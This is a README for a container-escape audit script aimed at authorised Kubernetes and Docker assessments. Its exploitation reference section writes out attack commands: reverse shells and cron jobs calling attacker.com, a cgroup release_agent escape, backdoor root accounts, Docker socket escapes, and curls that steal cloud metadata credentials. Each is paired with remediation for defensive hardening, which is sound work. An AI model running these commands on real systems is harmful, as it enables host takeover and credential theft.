# K8s-container_escape_audit
Look for possible escape vectors from a container

# 🔍 container-escape-audit

A bash script for detecting container escape vectors from within a running Docker or Kubernetes container. Designed for authorised penetration testing, red team assessments, and security hardening reviews.

> ⚠️ **For authorised security assessments only.** Do not run this script on systems you do not have explicit written permission to test.

---

## Overview

`container_escape_audit.sh` runs inside a container and performs 23 checks across the primary categories of container escape — privileged configuration, dangerous Linux capabilities, namespace isolation, filesystem mounts, kernel exposure, Kubernetes misconfigurations, and cloud metadata access.

Each finding produces a structured report entry covering:

- **What it is**: the misconfiguration or exposure
- **Impact**: worst-case outcome if exploited
- **Exploitability**: difficulty, required tooling, real-world precedent
- **Recommendation**: specific remediation steps

---

## Checks

### Container configuration

| # | Check | Severity |
|---|-------|----------|
| 1 | Privileged container (`--privileged`) | CRITICAL |
| 2 | Dangerous Linux capabilities (CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_SYS_MODULE, etc.) | HIGH |
| 3 | Host namespace sharing (PID, network, IPC, UTS, mount) | HIGH |
| 11 | Seccomp / AppArmor / SELinux disabled or unconfined | MEDIUM |

### Filesystem and mounts

| # | Check | Severity |
|---|-------|----------|
| 4 | Dangerous host filesystem mounts (`/`, `/etc`, `/dev`, `/sys`, runtime sockets) | CRITICAL |
| 5 | `/proc` filesystem exposure (core_pattern, sysrq-trigger, kcore, kmem, PID1 environ) | CRITICAL |
| 8 | Writable cron directories | HIGH |
| 9 | Writable authentication files (`/etc/passwd`, `/etc/shadow`, `/etc/sudoers`) | CRITICAL |
| 13 | SUID/SGID binaries | MEDIUM |
| 17 | Writable dynamic linker config (`/etc/ld.so.preload`, `ld.so.conf.d`) | HIGH |
| 23 | OverlayFS upper directory writability / layer inspection | MEDIUM |

### Kernel

| # | Check | Severity |
|---|-------|----------|
| 10 | `/dev/mem` access and ptrace scope | CRITICAL |
| 12 | cgroup v1 `release_agent` escape path | CRITICAL |
| 14 | Kernel version and CVE checks (DirtyPipe CVE-2022-0847, DirtyCOW CVE-2016-5195) | HIGH |
| 19 | cgroup v2 writability | MEDIUM |
| 22 | Kernel module loading status (`modules_disabled`) | INFO |

### Kubernetes and cloud

| # | Check | Severity |
|---|-------|----------|
| 6 | Kubernetes service account token and RBAC permissions | HIGH–CRITICAL |
| 7 | Environment variable secret leakage | MEDIUM |
| 15 | Cloud instance metadata service reachable (AWS, Azure, GCP) | CRITICAL |
| 16 | Kubelet API exposed unauthenticated (ports 10250, 10255) | CRITICAL |
| 20 | Secret mount directories (`/run/secrets`, `/var/run/secrets`) | HIGH |

### Host access

| # | Check | Severity |
|---|-------|----------|
| 18 | Namespace escape tooling present (`nsenter`, `unshare`, `runc`, `crictl`) | MEDIUM |
| 21 | SSH private keys readable | HIGH |

---

## Usage

```bash
# Download and run
curl -O https://raw.githubusercontent.com/liamromanis101/K8s-container_escape_audit/blob/main/container_escape_audit.sh
chmod +x container_escape_audit.sh
./container_escape_audit.sh
```

### Options

```
--report <file>    Write detailed report to <file>
                   Default: container_escape_report_<timestamp>.txt
--json             Emit JSON summary to stdout (for SIEM/log ingestion)
--quiet            Suppress info lines; print only WARN/CRITICAL to terminal
--no-report        Skip writing the report file entirely
```

### Examples

```bash
# Standard run — report written to timestamped file
./container_escape_audit.sh

# Custom report path
./container_escape_audit.sh --report /tmp/audit_$(hostname).txt

# JSON output — filter CRITICAL findings
./container_escape_audit.sh --json --no-report | jq '.findings[] | select(.severity=="CRITICAL")'

# Pipe JSON into a file and suppress terminal noise
./container_escape_audit.sh --json --quiet --no-report > findings.json

# Quiet terminal output with report
./container_escape_audit.sh --quiet --report ./report.txt
```

### Running inside a Kubernetes pod

```bash
# Copy into a running pod
kubectl cp container_escape_audit.sh <namespace>/<pod>:/tmp/audit.sh

# Execute
kubectl exec -n <namespace> <pod> -- bash /tmp/audit.sh --report /tmp/report.txt

# Retrieve the report
kubectl cp <namespace>/<pod>:/tmp/report.txt ./audit_report.txt
```

### Running as a Kubernetes Job

```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: container-escape-audit
spec:
  template:
    spec:
      restartPolicy: Never
      containers:
        - name: audit
          image: alpine:latest
          command:
            - sh
            - -c
            - |
              apk add --no-cache bash curl && \
              curl -sO https://raw.githubusercontent.com/liamromanis101/K8s-container_escape_audit/blob/main/container_escape_audit.sh && \
              chmod +x container_escape_audit.sh && \
              ./container_escape_audit.sh --json
```

**1. Save the file**

Save the above as `audit-job.yaml`.

**2. Apply the Job**

```bash
kubectl apply -f audit-job.yaml
```

**3. Wait for completion**

```bash
kubectl wait --for=condition=complete job/container-escape-audit --timeout=120s
```

**4. Retrieve the output**

```bash
# Get the name of the pod that was created by the Job
kubectl get pods --selector=job-name=container-escape-audit

# Stream the audit results
kubectl logs job/container-escape-audit
```

**5. Clean up**

The Job and its pod are not automatically deleted. Remove them once you have retrieved the output:

```bash
kubectl delete job container-escape-audit
```

> **Note:** By default this Job runs with whatever the cluster's default security context is, which is intentional — the audit is designed to reflect the real permissions available to an unprivileged workload. If you want to test a specific security context (e.g. with a particular service account or capability set), add the relevant `securityContext` or `serviceAccountName` fields to the pod spec before applying.

---

## Output

### Terminal output

```
========================================================
  container_escape_audit.sh v2.0
  Container escape vector detection
  FOR AUTHORISED SECURITY ASSESSMENTS ONLY
========================================================

--- 1. Privileged container ---
[ OK ]  Container does not appear fully privileged (CapEff=00000000a80425fb)

--- 4. Dangerous filesystem mounts ---
[CRIT]  Container runtime socket accessible: /var/run/docker.sock

--- 6. Kubernetes service account ---
[WARN]  Service account token readable: eyJhbGciOiJSUzI1NiIs...

==================== SUMMARY ====================
  [CRITICAL] Container runtime socket accessible: /var/run/docker.sock
  [HIGH    ] Kubernetes service account token is readable
  [MEDIUM  ] Seccomp is disabled for this container

  CRITICAL: 1  |  HIGH: 2  |  MEDIUM: 3  |  INFO: 1
```

### Report file

Each finding is written with full context:

```
============================================================
 CRITICAL FINDINGS
============================================================

  ID           : runtime_socket___var_run_docker_sock
  Severity     : CRITICAL
  Title        : Container runtime socket accessible: /var/run/docker.sock

  WHAT IT IS
    The container runtime's UNIX domain socket is bind-mounted into the
    container. This socket is the administrative API for the container
    daemon, which runs as root on the host.

  IMPACT
    Full host node compromise. An attacker uses the Docker API to create
    a new privileged container with the host root filesystem mounted,
    exec into it, and obtain a root shell on the host.

  EXPLOITABILITY
    Trivial. 'docker run -v /:/host --privileged alpine chroot /host'
    is a single command. CDK and deepce perform this automatically on
    socket detection.

  RECOMMENDATION
    Never mount the runtime socket into application containers. For
    CI/CD build use cases, use rootless Docker, Kaniko, or Buildah.
    Detect socket mounts with admission controllers.

  ------------------------------------------------------------
```

### JSON output

```json
{
  "tool": "container_escape_audit",
  "version": "2.0",
  "timestamp": "2025-04-16T10:32:00Z",
  "host": "webapp-7d4f9c-xkq2p",
  "kernel": "5.15.0-1034-aws",
  "findings": [
    {
      "id": "runtime_socket___var_run_docker_sock",
      "severity": "CRITICAL",
      "title": "Container runtime socket accessible: /var/run/docker.sock",
      "what": "The container runtime UNIX socket is bind-mounted...",
      "impact": "Full host node compromise...",
      "exploitability": "Trivial. Single command escape...",
      "recommendation": "Never mount the runtime socket into application containers..."
    }
  ]
}
```

---

## Requirements

The script requires only standard POSIX utilities present in virtually all container base images:

| Tool | Required | Used for |
|------|----------|----------|
| `bash` | Yes | Script execution |
| `grep`, `awk`, `find`, `cat` | Yes | Core checks |
| `curl` | Optional | IMDS and kubelet API checks |
| `kubectl` | Optional | Kubernetes RBAC enumeration |
| `capsh` | Optional | Human-readable capability decoding |
| `ip` | Optional | Node IP detection for kubelet checks |
| `sestatus` | Optional | SELinux status |

---

## Severity levels

| Level | Meaning |
|-------|---------|
| **CRITICAL** | Immediate host escape likely with minimal effort |
| **HIGH** | Significant risk; exploitable with moderate effort or in combination with other findings |
| **MEDIUM** | Defence-in-depth gap; increases exploitability of other findings |
| **INFO** | Informational; recorded for context and cross-referencing |

---

## Escape techniques covered

The script covers the following well-known container escape primitives:

- **Docker socket escape**: create privileged containers via the daemon API
- **Privileged container mount**: mount raw host block devices
- **cgroup v1 release_agent**: kernel executes payload on the host when a cgroup empties
- **core_pattern pipe handler**: kernel executes payload as root on any process crash
- **Shocker / CAP_DAC_READ_SEARCH**: read host files by inode via `open_by_handle_at(2)`
- **CAP_SYS_ADMIN + unshare/nsenter**: re-enter host namespaces
- **Kernel module loading**: load malicious `.ko` for unrestricted kernel code execution
- **DirtyPipe (CVE-2022-0847)**: overwrite read-only files on host mounts without privileges
- **DirtyCOW (CVE-2016-5195)**: race condition write to read-only memory mappings
- **Kubernetes service account abuse**: API server access with over-privileged RBAC
- **Kubelet unauthenticated exec**: remote code execution in any pod on the node
- **Cloud IMDS credential theft**: steal IAM credentials for cloud control plane access
- **Host namespace escape**: `nsenter` into host PID/net/mount namespaces
- **ld.so.preload injection**: load malicious library into SUID binary execution
- **/dev/mem access**: read/write physical host memory

---

## Interpreting results

A single CRITICAL finding is generally sufficient for a complete host compromise. Multiple findings in combination can elevate lower-severity issues — for example, a MEDIUM seccomp finding combined with a HIGH capability finding may together constitute a practical escape path.

The report is intended to be handed directly to a remediation team. Each recommendation references the specific Kubernetes API field, seccomp configuration, or sysctl setting needed to address the finding.

---

## 🔓 Container Escape & Exploitation Reference

> **Purpose:** Documents what an attacker could do if each check returns a finding, so you understand the real-world impact and can prioritise remediation.
>
> ⚠️ **Disclaimer:** For authorised security testing and defensive purposes only. Use this information solely to assess and harden your own infrastructure.

---

<details>
<summary><h3>Container Configuration</h3></summary>

#### Check 1 — Privileged Container (`--privileged`) `CRITICAL`

A privileged container has full access to the host kernel and all devices. Escape is trivial:

```bash
# Mount the host root filesystem
mkdir /tmp/host && mount /dev/sda1 /tmp/host

# Chroot into the host
chroot /tmp/host bash

# Or write a reverse shell into the host crontab
echo '* * * * * root bash -i >& /dev/tcp/attacker.com/4444 0>&1' \
  >> /tmp/host/etc/crontab
```

**Remediation:** Remove `--privileged`. Use `securityContext.capabilities` to grant only the specific capabilities the workload requires.

---

#### Check 2 — Dangerous Linux Capabilities `HIGH`

| Capability | Exploit Path |
|---|---|
| `CAP_SYS_ADMIN` | Mount filesystems, load kernel modules, use `ptrace` on any process |
| `CAP_SYS_PTRACE` | Attach to any host process via `ptrace`, inject shellcode |
| `CAP_SYS_MODULE` | Load a malicious kernel module (`insmod rootkit.ko`) |
| `CAP_NET_ADMIN` | Reroute traffic, ARP spoofing, modify host iptables rules |
| `CAP_DAC_OVERRIDE` | Bypass all filesystem permission checks |

```bash
# With CAP_SYS_PTRACE — enter all host namespaces via PID 1
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

**Remediation:** Drop all capabilities and add back only what is needed:

```yaml
securityContext:
  capabilities:
    drop: ["ALL"]
    add: ["NET_BIND_SERVICE"]  # example: only add what's required
```

---

#### Check 3 — Host Namespace Sharing `HIGH`

```bash
# hostPID: true — enumerate and ptrace host processes
ps aux
nsenter -t 1 -m -u -i -n -p -- bash   # full host shell via PID 1

# hostNetwork: true — bind to host ports, sniff traffic
tcpdump -i eth0

# hostIPC: true — read/write host shared memory segments
ipcs -a
```

**Remediation:** Explicitly disable all host namespace sharing in the pod spec:

```yaml
spec:
  hostPID: false
  hostNetwork: false
  hostIPC: false
```

---

#### Check 11 — Seccomp / AppArmor / SELinux Disabled `MEDIUM`

Without syscall filtering, dangerous kernel interfaces are fully exposed:

```bash
# Exploit kernel vulnerabilities requiring unfiltered syscalls
# e.g. namespace escape via unshare
unshare -UrmC --fork bash
```

**Remediation:** Apply the `RuntimeDefault` seccomp profile and enforce AppArmor/SELinux profiles on nodes:

```yaml
securityContext:
  seccompProfile:
    type: RuntimeDefault
```

</details>

---

<details>
<summary><h3>Filesystem and Mounts</h3></summary>

#### Check 4 — Dangerous Host Filesystem Mounts `CRITICAL`

```bash
# If the Docker socket is mounted — instant host root
docker -H unix:///var/run/docker.sock run -v /:/host --privileged alpine \
  chroot /host bash

# If /etc is mounted writable — add a root user to the host
echo 'backdoor::0:0::/root:/bin/bash' >> /etc/passwd
su backdoor

# If / is mounted — chroot directly to host
chroot /host-mount bash
```

**Remediation:** Never mount the Docker or containerd socket into containers. For any required mounts, use `readOnly: true`:

```yaml
volumeMounts:
  - name: config
    mountPath: /etc/app-config
    readOnly: true
```

---

#### Check 5 — `/proc` Filesystem Exposure `CRITICAL`

```bash
# core_pattern exploit — execute arbitrary code on the host kernel
echo '|/tmp/payload' > /proc/sys/kernel/core_pattern
# Trigger a crash to execute /tmp/payload in the host context

# Read credentials and tokens from host process environment
cat /proc/1/environ | tr '\0' '\n'

# Crash or reboot the host via sysrq
echo b > /proc/sysrq-trigger
```

**Remediation:** Use a PID namespace so `/proc` reflects only container processes. Mount `/proc/sys` read-only. Deny writes via seccomp.

---

#### Check 8 — Writable Cron Directories `HIGH`

```bash
# Drop a root cron job that phones home
echo '* * * * * root curl http://attacker.com/shell.sh | bash' \
  > /etc/cron.d/backdoor
```

**Remediation:** Cron directories should never be writable at runtime. Enforce a read-only root filesystem:

```yaml
securityContext:
  readOnlyRootFilesystem: true
```

---

#### Check 9 — Writable Authentication Files `CRITICAL`

```bash
# Add a passwordless root account
echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd
su pwned

# Grant passwordless sudo to all users
echo 'ALL ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers
```

**Remediation:** These files must never be writable inside a container. Use `readOnlyRootFilesystem: true`. If runtime writes are needed elsewhere, use an `emptyDir` for those specific paths only.

---

#### Check 13 — SUID/SGID Binaries `MEDIUM`

```bash
# Find SUID binaries in the container
find / -perm -4000 -type f 2>/dev/null

# Classic SUID escape — see gtfobins.github.io for full list
# Example: if /usr/bin/find has SUID bit set
find . -exec /bin/bash -p \; -quit
```

**Remediation:** Strip SUID/SGID bits during the image build:

```dockerfile
RUN find / -xdev -perm /6000 -type f -exec chmod a-s {} \;
```

---

#### Check 17 — Writable Dynamic Linker Config `HIGH`

```bash
# Inject a malicious shared library — loaded before everything else
echo '/tmp/evil_lib' > /etc/ld.so.preload
# All subsequent privileged binary executions load your library first
```

**Remediation:** Use `readOnlyRootFilesystem: true`. Ensure `/etc/ld.so.preload` and `/etc/ld.so.conf.d/` are never writable inside the container.

---

#### Check 23 — OverlayFS Upper Directory Writability `MEDIUM`

With access to the OverlayFS upper layer, an attacker can modify files that appear read-only inside the container, or inspect the layers of co-located containers.

**Remediation:** Restrict access to the container runtime's storage directories on the host (`/var/lib/docker`, `/var/lib/containerd`). Ensure container processes cannot reach the host storage path.

</details>

---

<details>
<summary><h3>Kernel</h3></summary>

#### Check 10 — `/dev/mem` Access and ptrace Scope `CRITICAL`

```bash
# /dev/mem exposes raw physical memory — read kernel secrets or patch running code
dd if=/dev/mem bs=1 skip=$((0x100000)) count=1024 | strings

# ptrace_scope=0 allows any process to attach to any other
# Attach to a privileged host process and overwrite its memory
```

**Remediation:** Ensure `/dev/mem` is not accessible in the container. Set `kernel.yama.ptrace_scope=1` (or higher) on all nodes. Block `ptrace` via seccomp.

---

#### Check 12 — cgroup v1 `release_agent` Escape `CRITICAL`

A well-known escape requiring only write access to a cgroup filesystem:

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

# Write the payload path for the host to execute
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Payload executes on the host when the cgroup empties
echo '#!/bin/sh' > /cmd
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

**Remediation:** Migrate to cgroup v2 (`--cgroupns=private`). Block `mount` syscalls via seccomp. Ensure containers cannot mount cgroup filesystems.

---

#### Check 14 — Kernel CVEs `HIGH`

| CVE | Kernels Affected | Impact |
|---|---|---|
| **DirtyPipe** CVE-2022-0847 | 5.8 – 5.16.11 | Overwrite read-only files (e.g. `/etc/passwd`) via the `pipe` splice mechanism |
| **DirtyCOW** CVE-2016-5195 | < 4.8.3 | Race condition in copy-on-write allows writing to read-only memory-mapped files |

Public PoC code exists for both. Exploitation leads to local privilege escalation to root on the host.

**Remediation:** Patch the host kernel. Verify with `uname -r`. Integrate a node OS scanner (Trivy, Grype) into your CI/CD pipeline.

---

#### Check 19 — cgroup v2 Writability `MEDIUM`

Writable cgroup v2 interfaces can enable resource exhaustion attacks. In certain configurations, `ebpf`-based hooks attached via cgroup may also be abused.

**Remediation:** Mount cgroup2 read-only where possible. Restrict `CAP_SYS_ADMIN`, which is required for most cgroup manipulation.

---

#### Check 22 — Kernel Module Loading `INFO`

If module loading is enabled and `CAP_SYS_MODULE` is available:

```bash
# Load a rootkit directly into the host kernel
insmod /tmp/rootkit.ko
```

**Remediation:** Set `kernel.modules_disabled=1` on hardened nodes. Deny `CAP_SYS_MODULE` in all Pod Security Admission policies.

</details>

---

<details>
<summary><h3>Kubernetes and Cloud</h3></summary>

#### Check 6 — Service Account Token & RBAC `HIGH–CRITICAL`

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# Enumerate what this token can do
curl -s -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews

# If the token has secrets access — dump all secrets in the namespace
curl -s -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets

# If the token has pod/create — launch a privileged escape pod
curl -s -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  $APISERVER/api/v1/namespaces/default/pods -d @evil-privileged-pod.json
```

**Remediation:**

```yaml
spec:
  automountServiceAccountToken: false  # disable if not needed
```

Apply least-privilege RBAC. Use dedicated service accounts per workload. Audit permissions with `kubectl auth can-i --list`.

---

#### Check 7 — Environment Variable Secret Leakage `MEDIUM`

```bash
# Secrets passed as env vars are trivially readable
printenv

# Also visible via /proc even if the app doesn't expose them
cat /proc/1/environ | tr '\0' '\n'
```

**Remediation:** Mount secrets as files rather than env vars. Better still, use an external secrets manager (HashiCorp Vault, AWS Secrets Manager, GCP Secret Manager). Rotate any exposed credentials immediately.

---

#### Check 15 — Cloud Instance Metadata Service (IMDS) Reachable `CRITICAL`

```bash
# AWS — retrieve node IAM role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# Returns AccessKeyId, SecretAccessKey, SessionToken — immediately usable with AWS CLI

# GCP — retrieve service account OAuth token
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure — retrieve managed identity token
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

**Remediation:**
- **AWS:** Enforce IMDSv2 on all nodes (requires a signed `PUT` request — not accessible via simple `curl`)
- **GCP/Azure:** Use Workload Identity instead of node-level credentials
- **All:** Block IMDS access from pods via `NetworkPolicy` if containers don't require it

---

#### Check 16 — Kubelet API Exposed Unauthenticated `CRITICAL`

```bash
# Port 10250 — if anonymous auth is enabled
curl -sk https://<node-ip>:10250/pods          # list all pods on the node

# Execute commands in any container on the node — no kubeconfig needed
curl -sk https://<node-ip>:10250/run/<namespace>/<pod>/<container> \
  -d "cmd=cat /etc/shadow"

# Port 10255 (read-only, no auth required)
curl http://<node-ip>:10255/pods               # full pod spec disclosure
```

**Remediation:** Set `--anonymous-auth=false` and `--authorization-mode=Webhook` on the kubelet. Restrict access to ports 10250/10255 via firewall rules or security groups — only the control plane should reach these ports.

---

#### Check 20 — Secret Mount Directories `HIGH`

```bash
# Service account token and CA cert
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Any mounted Kubernetes Secrets
ls /run/secrets/
cat /run/secrets/db-password
```

**Remediation:** Only mount secrets in pods that require them. Use projected service account tokens with short expiry:

```yaml
volumes:
  - name: token
    projected:
      sources:
        - serviceAccountToken:
            expirationSeconds: 3600
            path: token
```

</details>

---

<details>
<summary><h3>Host Access</h3></summary>

#### Check 18 — Namespace Escape Tooling Present `MEDIUM`

```bash
# nsenter — enter host namespaces directly via PID 1
# (requires hostPID:true or CAP_SYS_PTRACE)
nsenter -t 1 -m -u -i -n -p -- bash

# runc — if the container runtime socket is also accessible
runc --root /var/run/runc run escape

# crictl — list and exec into any container on the node
crictl ps
crictl exec -it <container-id> bash
```

**Remediation:** Keep container images minimal — these tools should never be present in production workloads. Use distroless or scratch-based base images. Enforce image scanning in CI to catch unexpected binaries.

---

#### Check 21 — SSH Private Keys Readable `HIGH`

```bash
# Search for private keys
find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null

# Use the key to pivot to other internal systems
ssh -i /found/key user@internal-host
```

**Remediation:** Never bake SSH keys into container images — audit image layers with `docker history` or Trivy. Use short-lived certificates (Vault SSH Secrets Engine, AWS EC2 Instance Connect) instead of long-lived static keys. Revoke any keys found exposed.

</details>

## Integration

### Falco (runtime detection complement)

This script performs point-in-time assessment. For continuous runtime detection of the same techniques, pair with [Falco](https://falco.org/) rules covering:

- Writes to `release_agent` or `core_pattern`
- Spawning of `nsenter`, `unshare`, or `runc` inside containers
- Access to `/var/run/docker.sock`
- Unexpected outbound connections to `169.254.169.254`

### CI/CD integration (example)

```bash
# Fail pipeline if any CRITICAL findings are present
CRITICAL_COUNT=$(./container_escape_audit.sh --json --no-report | jq '[.findings[] | select(.severity=="CRITICAL")] | length')
if [ "$CRITICAL_COUNT" -gt 0 ]; then
  echo "FAILED: $CRITICAL_COUNT critical escape vectors detected"
  exit 1
fi
```

### SIEM / log ingestion (example)

```bash
./container_escape_audit.sh --json --no-report | \
  jq -c '.findings[]' | \
  while read -r finding; do
    curl -s -X POST https://your-siem/api/events \
      -H 'Content-Type: application/json' \
      -d "$finding"
  done
```

---

## Legal

This tool is provided for **authorised security testing only**. Running it against systems without explicit written permission from the system owner may be illegal in your jurisdiction. The authors accept no liability for misuse.

There is no license attached to this project, meaning that Liam Romanis retains full rights over this project. 

---

## Contributing

Pull requests are welcome. When adding a new check, please follow the existing pattern:

1. Add a `check_<name>()` function
2. Call `add_finding` with all seven fields: id, severity, title, what, impact, exploitability, recommendation
3. Register the function call in the MAIN section
4. Update this README's checks table

Send me a request if you want to join the project...

---

## References

- [Linux Capabilities man page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [GTFOBins — SUID binary exploitation](https://gtfobins.github.io/)
- [Kubernetes Pod Security Admission](https://kubernetes.io/docs/concepts/security/pod-security-admission/)
- [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
- [CVE-2022-0847 DirtyPipe](https://dirtypipe.cm4all.com/)
- [CVE-2019-5736 runc escape](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
- [Felix Wilhelm's cgroup release_agent PoC](https://twitter.com/_fel1x/status/1151487051986087936)
- [deepce — Docker Enumeration, Escalation of Privileges and Container Escapes](https://github.com/stealthcopter/deepce)
- [CDK — Container penetration toolkit](https://github.com/cdk-team/CDK)
- [Trail of Bits — Understanding and Hardening Linux Containers](https://github.com/trailofbits/publications/blob/master/papers/understanding_hardening_linux_containers.pdf)
